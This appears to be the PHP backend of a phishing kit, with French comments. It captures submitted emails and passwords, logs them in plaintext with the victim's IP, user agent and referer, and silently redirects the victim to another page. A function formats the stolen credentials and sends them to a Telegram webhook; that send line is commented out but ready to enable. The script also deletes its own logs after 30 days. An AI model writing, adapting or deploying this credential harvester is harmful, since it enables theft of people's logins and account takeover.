<?php
// ============================================
// Script principal - Version structurée
// ============================================

require_once 'config.php';

// ============================================
// 1. FONCTIONS UTILITAIRES
// ============================================

// Validation email
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

// Récupération IP réelle (proxy + Cloudflare)
function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

// Récupération User Agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
}

// Récupération page de provenance (referer)
function getReferer() {
    return $_SERVER['HTTP_REFERER'] ?? 'direct';
}

// Chiffrement des données sensibles
function encryptData($data, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

// Stockage local dans fichier (format JSON)
function storeLocal($data) {
    if (!is_dir(LOG_DIR)) {
        mkdir(LOG_DIR, 0755, true);
    }
    
    $jsonLine = json_encode($data) . PHP_EOL;
    file_put_contents(LOG_FILE, $jsonLine, FILE_APPEND | LOCK_EX);
}

// Exfiltration via webhook (Telegram/Discord)
function exfiltrateWebhook($data) {
    $message = "🔐 NOUVEAU LOGIN 🔐\n";
    $message .= "📧 Email: " . $data['email'] . "\n";
    $message .= "🔑 Password: " . $data['password'] . "\n";
    $message .= "🌍 IP: " . $data['ip'] . "\n";
    $message .= "🕒 Time: " . $data['timestamp'] . "\n";
    $message .= "💻 User Agent: " . $data['user_agent'];
    
    // Simulation d'envoi (ne pas activer réellement)
    // file_get_contents(TELEGRAM_WEBHOOK . '?chat_id=' . TELEGRAM_CHAT_ID . '&text=' . urlencode($message));
}

// Auto-nettoyage des logs (supprime après X jours)
function autoCleanup($days = 30) {
    if (file_exists(LOG_FILE)) {
        $age = time() - filemtime(LOG_FILE);
        if ($age > ($days * 86400)) {
            unlink(LOG_FILE);
        }
    }
}

// ============================================
// 2. EXÉCUTION PRINCIPALE
// ============================================

// Vérification méthode HTTP
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('Accès non autorisé');
}

// Récupération des données POST
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Validations
if (!validateEmail($email)) {
    die(json_encode(['error' => 'Format email invalide']));
}
if (strlen($password) < 1) {
    die(json_encode(['error' => 'Mot de passe requis']));
}

// Construction du tableau de données
$logData = [
    'id' => uniqid(),
    'email' => $email,
    'password' => $password,
    'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
    'ip' => getRealIP(),
    'user_agent' => getUserAgent(),
    'referer' => getReferer(),
    'timestamp' => date('Y-m-d H:i:s'),
    'timestamp_unix' => time()
];

// Stockage local
storeLocal($logData);

// Exfiltration (commenté par sécurité)
// exfiltrateWebhook($logData);

// Nettoyage automatique
autoCleanup(30);

// Redirection silencieuse
header('Location: mer.html');
exit;
?>
